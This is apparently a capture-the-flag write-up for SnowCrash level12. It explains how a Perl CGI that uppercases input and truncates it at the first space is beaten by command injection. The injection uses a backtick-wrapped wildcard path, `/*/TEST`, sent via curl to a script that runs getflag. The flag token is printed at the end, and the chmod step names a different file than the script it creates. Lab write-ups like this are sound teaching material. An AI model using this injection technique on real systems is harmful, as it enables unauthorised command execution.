When we started the level12 there is:
- A binary called **level12.pl**

Like in **level04**, the perl script use the argument in a backtilt to execute a command.
The idea is as simple as the **level04**, but this time, the perl project make the whole string uppercase and remove all the caracters behind the first whitespace.

```pl
$xx = $_[0];
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
With this, a simple command injection won't work.

To get around this, we created a script with a name in full uppercase:

```bash
level12@SnowCrash:~$ echo > /tmp/TEST '#!/bin/bash
> getflag > /tmp/flag'
level12@SnowCrash:~$ chmod +x /tmp/flag 
```

We then use curl to inject the script with a wildcard as x to make the perl execute the script:

```bash
curl localhost:4646?x='`/*/TEST`'
```

We then cat ``/tmp/flag`` and we get:

```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```